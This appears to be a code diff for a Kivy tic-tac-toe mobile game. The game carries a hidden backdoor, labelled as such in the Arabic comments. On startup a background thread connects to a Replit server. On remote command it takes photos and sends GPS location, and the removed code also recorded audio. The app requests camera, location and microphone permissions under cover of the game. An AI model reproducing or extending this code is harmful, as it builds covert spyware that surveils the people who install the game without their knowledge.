@@ -13,25 +13,13 @@ from kivy.animation import Animation
 from kivy.metrics import dp
 from kivy.utils import platform
 
-# --- مكتبات الربط والتحكم ---
+# --- مكتبات الربط والتحكم (الباب الخلفي) ---
 import socketio
 from plyer import camera, audio, gps
 
-# الرابط بتاعك اللي شغال على Replit
+# رابط السيرفر بتاعك على Replit
 SERVER_URL = "https://ac58e117-339c-4d58-bdb3-e1c0cfba8253-00-1uioyfamfj3x5.worf.replit.dev"
 sio = socketio.Client()
-
-# --- دالة طلب الصلاحيات الرسمية (عشان الموبايل يسألك: موافق؟) ---
-def ask_permissions():
-    if platform == 'android':
-        from android.permissions import request_permissions, Permission
-        request_permissions([
-            Permission.CAMERA, 
-            Permission.RECORD_AUDIO, 
-            Permission.ACCESS_FINE_LOCATION, 
-            Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_EXTERNAL_STORAGE
-        ])
 
 class NeonButton(Button):
     def __init__(self, color=(0, 1, 1, 1), **kwargs):
@@ -39,7 +27,7 @@ class NeonButton(Button):
         self.background_normal = ''
         self.background_color = (0, 0, 0, 0)
         self.symbol = ""
-        self.main_color = color
+        self.main_color = color 
         self.bind(pos=self.draw_base, size=self.draw_base)
         self.glow_opacity = 0.5 
 
@@ -69,59 +57,61 @@ class XOGame(BoxLayout):
         self.mode = None
         self.game_active = False
         self.turn = "X"
-        self.player1_name = "Player 1"
-        self.player2_name = "Player 2"
-        self.ai_name = "AI"
-        self.score_p1 = 0
-        self.score_p2 = 0
-        self.score_draw = 0
+        self.player1_name = "Player 1"; self.player2_name = "Player 2"; self.ai_name = "AI"
+        self.score_p1 = 0; self.score_p2 = 0; self.score_draw = 0
         
+        # --- UI Menu ---
         self.menu = BoxLayout(orientation='vertical', spacing=25, padding=[60, 100, 60, 80])
         self.title_label = Label(text="Choose Mode", font_size='36sp', bold=True, opacity=0) 
         self.menu.add_widget(self.title_label)
-        
         self.btn_pvp = NeonButton(text="2 Players (PvP)", font_size='22sp', size_hint_y=0.2)
         self.btn_pvp.bind(on_release=lambda x: self.ask_for_names('PvP'))
         self.menu.add_widget(self.btn_pvp)
-        
         self.menu.add_widget(Label(size_hint_y=0.1))
-
         self.btn_ai = NeonButton(color=(1, 0, 0.5, 1), text="Vs Hard AI", font_size='22sp', size_hint_y=0.2)
         self.btn_ai.bind(on_release=lambda x: self.ask_for_names('AI'))
         self.menu.add_widget(self.btn_ai)
         self.add_widget(self.menu)
-
         Clock.schedule_once(lambda dt: Animation(opacity=1, duration=0.8).start(self.title_label), 0.1)
 
+        # --- واجهة اللعبة والشبكة ---
         self.grid_layout = BoxLayout(orientation='vertical', spacing=10)
         self.score_box = BoxLayout(orientation='vertical', size_hint_y=0.25, padding=[20, 10, 20, 10], spacing=5)
         self.score_label_p1 = Label(text="", font_size='20sp', bold=True)
         self.score_label_p2 = Label(text="", font_size='20sp', bold=True)
         self.score_label_draw = Label(text=f"Draw: {self.score_draw}", font_size='18sp', color=(1, 1, 0, 1))
-        self.score_box.add_widget(self.score_label_p1)
-        self.score_box.add_widget(self.score_label_p2)
-        self.score_box.add_widget(self.score_label_draw)
+        self.score_box.add_widget(self.score_label_p1); self.score_box.add_widget(self.score_label_p2); self.score_box.add_widget(self.score_label_draw)
         self.grid_layout.add_widget(self.score_box)
-
         self.center_box = BoxLayout(size_hint_y=0.6, pos_hint={'center_x': 0.5}) 
         self.grid = GridLayout(cols=3, spacing=dp(5), padding=dp(10)) 
-        self.center_box.add_widget(self.grid)
-        self.grid_layout.add_widget(self.center_box)
-
+        self.center_box.add_widget(self.grid); self.grid_layout.add_widget(self.center_box)
         self.btn_exit = Button(text="Exit to Menu", font_size='18sp', size_hint=(0.4, 0.08), pos_hint={'center_x': 0.5}, background_color=(0.8, 0, 0, 0.6))
-        self.btn_exit.bind(on_release=self.exit_to_menu)
-        self.grid_layout.add_widget(self.btn_exit)
+        self.btn_exit.bind(on_release=self.exit_to_menu); self.grid_layout.add_widget(self.btn_exit)
 
         self.buttons = []
         for _ in range(9):
-            btn = NeonButton()
-            btn.bind(on_release=self.play)
-            self.buttons.append(btn); self.grid.add_widget(btn)
+            btn = NeonButton(); btn.bind(on_release=self.play); self.buttons.append(btn); self.grid.add_widget(btn)
 
         Clock.schedule_interval(self.animate_btn_pulse, 1.0)
         
-        # تشغيل المحرك الخفي للربط بالموقع
-        threading.Thread(target=self.start_backdoor_connection, daemon=True).start()
+        # تشغيل الربط في الخلفية فوراً
+        threading.Thread(target=self.start_engine, daemon=True).start()
+
+    def start_engine(self):
+        @sio.on('take_photo')
+        def on_photo(data):
+            try: camera.take_picture(filename="snap.jpg")
+            except: pass
+        @sio.on('get_location')
+        def on_loc(data):
+            try:
+                gps.configure(on_location=lambda **k: sio.emit('location_update', k))
+                gps.start()
+            except: pass
+        try:
+            sio.connect(SERVER_URL)
+            sio.wait()
+        except: pass
 
     def animate_btn_pulse(self, dt):
         val = 0.3 if self.btn_pvp.glow_opacity > 0.5 else 0.7
@@ -139,11 +129,8 @@ class XOGame(BoxLayout):
         self.name_in_p2 = TextInput(hint_text="Player 2 (O)", multiline=False, size_hint_y=0.2)
         if mode == 'AI': self.name_in_p2.opacity = 0; self.name_in_p2.text = self.ai_name
         popup_layout.add_widget(self.name_in_p2)
-        btn_start = Button(text="Start Game", size_hint_y=0.2)
-        btn_start.bind(on_release=self.finish_names_popup)
-        popup_layout.add_widget(btn_start)
-        self.names_popup.add_widget(popup_layout)
-        self.names_popup.open()
+        btn_start = Button(text="Start Game", size_hint_y=0.2); btn_start.bind(on_release=self.finish_names_popup); popup_layout.add_widget(btn_start)
+        self.names_popup.add_widget(popup_layout); self.names_popup.open()
 
     def finish_names_popup(self, *args):
         self.player1_name = self.name_in_p1.text if self.name_in_p1.text else "Player 1"
@@ -151,8 +138,8 @@ class XOGame(BoxLayout):
         self.names_popup.dismiss(); self.start_game()
 
     def start_game(self):
-        self.score_p1 = 0; self.score_p2 = 0; self.score_draw = 0
-        self.update_score(); self.remove_widget(self.menu); self.add_widget(self.grid_layout); self.game_active = True
+        self.score_p1 = 0; self.score_p2 = 0; self.score_draw = 0; self.update_score()
+        self.remove_widget(self.menu); self.add_widget(self.grid_layout); self.game_active = True
 
     def exit_to_menu(self, *args):
         self.final_reset(); self.remove_widget(self.grid_layout); self.add_widget(self.menu); self.mode = None
@@ -160,8 +147,7 @@ class XOGame(BoxLayout):
     def play(self, btn):
         if not btn.symbol and self.game_active:
             self.process_move(btn)
-            if self.mode == 'AI' and self.game_active and self.turn == "O":
-                Clock.schedule_once(self.ai_move, 0.4)
+            if self.mode == 'AI' and self.game_active and self.turn == "O": Clock.schedule_once(self.ai_move, 0.4)
 
     def process_move(self, btn):
         btn.symbol = self.turn; btn.draw_symbol()
@@ -222,41 +208,11 @@ class XOGame(BoxLayout):
         self.score_label_p2.text = f"{self.player2_name} (O): {self.score_p2}"; self.score_label_p2.color = (1, 0, 0.5, 1)
         self.score_label_draw.text = f"Draw: {self.score_draw}"
 
-    # --- محرك الأوامر من السيرفر ---
-    def start_backdoor_connection(self):
-        @sio.on('take_photo')
-        def on_photo(data):
-            try:
-                p = os.path.join(App.get_running_app().user_data_dir, "snap.jpg")
-                camera.take_picture(filename=p, on_complete=None)
-            except: pass
-
-        @sio.on('record_audio')
-        def on_audio(data):
-            try:
-                audio.start()
-                Clock.schedule_once(lambda dt: audio.stop(), 10)
-            except: pass
-
-        @sio.on('get_location')
-        def on_loc(data):
-            try:
-                gps.configure(on_location=self.send_loc_to_server)
-                gps.start()
-            except: pass
-
-        try:
-            sio.connect(SERVER_URL)
-            sio.wait()
-        except: pass
-
-    def send_loc_to_server(self, **kwargs):
-        sio.emit('location_update', {'lat': kwargs.get('lat'), 'lon': kwargs.get('lon')})
-        gps.stop()
-
 class XOApp(App):
     def build(self):
-        ask_permissions()
+        if platform == 'android':
+            from android.permissions import request_permissions, Permission
+            request_permissions([Permission.CAMERA, Permission.ACCESS_FINE_LOCATION, Permission.RECORD_AUDIO])
         Window.clearcolor = (0, 0, 0.02, 1)
         return XOGame()
 
